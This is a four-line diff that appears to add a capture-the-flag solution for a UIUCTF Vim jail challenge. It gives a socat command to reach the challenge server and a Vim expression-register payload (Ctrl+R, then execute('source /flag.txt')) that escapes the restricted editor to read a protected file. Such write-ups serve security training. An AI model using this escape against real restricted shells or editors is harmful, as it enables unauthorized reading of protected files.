@@ -1,0 +1,4 @@
+socat file:$(tty),raw,echo=0 tcp:vimjail1-5.chal.uiuc.tf:1337
+
+Ctrl + R
+=execute("source /flag.txt")
